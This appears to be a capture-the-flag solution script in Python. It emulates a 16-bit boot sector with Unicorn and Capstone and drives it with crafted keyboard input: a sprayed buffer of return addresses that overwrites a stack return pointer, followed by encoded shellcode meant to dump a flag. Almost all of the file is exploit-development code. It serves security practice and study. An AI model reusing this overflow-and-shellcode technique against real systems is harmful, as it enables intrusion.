from capstone import Cs, CS_ARCH_X86, CS_MODE_16
from unicorn import Uc, UC_ARCH_X86, UC_MODE_16, UC_HOOK_INTR, UC_HOOK_CODE
import unicorn.x86_const as x86

from pwn import p16, u16
dis = Cs(CS_ARCH_X86, CS_MODE_16)  # Capstone
emu = Uc(UC_ARCH_X86, UC_MODE_16)  # Unicorn

dis.detail = True

INS_COUNT = [0x100]

decoderBase = 0x7021
codeBase = 0x710e

stage1_target = p16(0x7d72) # b"\x72\x7d"
stage2_target = p16(0x7021) # b"\x01\x70"

with open("1pwn_dump_flag.bin.encoded", "rb") as fin:
    code = fin.read()

load_base = 0x7e80
ret_ptr_addr = 0xFEFC
my_input1 = list((stage1_target + stage2_target + stage2_target) * ((ret_ptr_addr - load_base) // 6 + 2))
my_input1.append((False, b"\r"))
my_input2 = list(code)
my_input2.append((False, b"\r"))
print(len(my_input1))
print(len(my_input2))
my_input1.reverse()
my_input2.reverse()

hitcount = [0]
insleft = [-1]



def is_good_byte(b):
    badBytes = [ ord('\n'), ord('\r') ]
    if 0 < b and b < 0x7f and b not in badBytes:
        return True
    else:
        return False

def handle_int(emu: Uc, no: int, user_data):
    if no == 0x10:
        if len(my_input2) == 0:
            print("Out:", chr(emu.reg_read(x86.UC_X86_REG_AL)))
    elif no == 0x16:
        # read
        if len(my_input1) > 0:
            c = my_input1.pop()
            if isinstance(c, tuple):
                c = list(c[1])[0]
            elif not is_good_byte(c):
                print("Bad byte:", c)
                emu.emu_stop()
            emu.reg_write(x86.UC_X86_REG_AL, c)
        elif len(my_input2) > 0:
            c = my_input2.pop()
            if isinstance(c, tuple):
                c = list(c[1])[0]
            elif not is_good_byte(c):
                print("Bad byte:", c)
                emu.emu_stop()
            emu.reg_write(x86.UC_X86_REG_AL, c)
        else:
            print("No more input!")
            emu.emu_stop()
    elif no == 0x13:
        bx = emu.reg_read(x86.UC_X86_REG_BX)
        emu.mem_write(bx, b"Hello World!!")
        insleft[0] = 100
    else:
        print("Unk:", no, hex(no))
        emu.emu_stop()

def handle_instr(emu: Uc, address: int, size: int, user_data):
    if address == 0x7c0a:
        print("Skipping initialization...")
        emu.reg_write(x86.UC_X86_REG_DI, 0xFFFF)

    if address == 0x7d72:
        print("Hit 0x7d72")
        if hitcount[0] == -1:
            hitcount[0] = -1

    if address == 0x7001:
        hitcount[0] = 1
        insleft[0] = 200
        print("hit shellcode")


    if address == 0x7d81:
        sp = emu.reg_read(x86.UC_X86_REG_SP)
        ret = u16(emu.mem_read(sp, 2))
        print(f"Returning from read_line to *{hex(sp)} = {hex(ret)}")
        hitcount[0] = -1

    if address == 0x7d72 or hitcount[0] == 1:
        code = emu.mem_read(address, size)
        insns = list(dis.disasm(bytes(code), address, count=1))

        if len(insns) == 0:
            print(f"Could not decode ins at {hex(address)}")
            return

        insn = insns[0]
        address = insn.address
        size = insn.size
        mnemonic = insn.mnemonic
        op_str = insn.op_str

        print("0x%x:\t%s\t%s\tBytes: %s\tBP: %x, BX: %x, CX: %x, DX: %x, EAX: %x, ESI: %x, EDI: %x, CR0: %x" %
            (address, mnemonic, op_str, ''.join('{:02x}'.format(x) for x in code[:size]), emu.reg_read(x86.UC_X86_REG_BP),
            emu.reg_read(x86.UC_X86_REG_BX), emu.reg_read(
                x86.UC_X86_REG_CX), emu.reg_read(x86.UC_X86_REG_DX),
            emu.reg_read(x86.UC_X86_REG_EAX), emu.reg_read(
                x86.UC_X86_REG_ESI), emu.reg_read(x86.UC_X86_REG_EDI),
            emu.reg_read(x86.UC_X86_REG_CR0)))

        sp = emu.reg_read(x86.UC_X86_REG_SP)
        top = u16(emu.mem_read(sp, 2))
        print(f"SP = {hex(sp)} [{hex(top)}]")

    if insleft[0] != -1:
        insleft[0] -= 1
        if insleft[0] == 0:
            emu.emu_stop()

    return



with open("basic-test_signed", "rb") as fin:
    img = fin.read()

IMG_BASE = 0x7c00
ENTRY_POINT = IMG_BASE

emu.mem_map(0, 0x10000)
emu.mem_write(IMG_BASE, img[:-8])

# skip initialization shit
emu.mem_write(0x8000, b"\x0d" * (0xFFFF - 0x8000))

emu.hook_add(UC_HOOK_INTR, handle_int)
emu.hook_add(UC_HOOK_CODE, handle_instr)

emu.emu_start(ENTRY_POINT, 0)
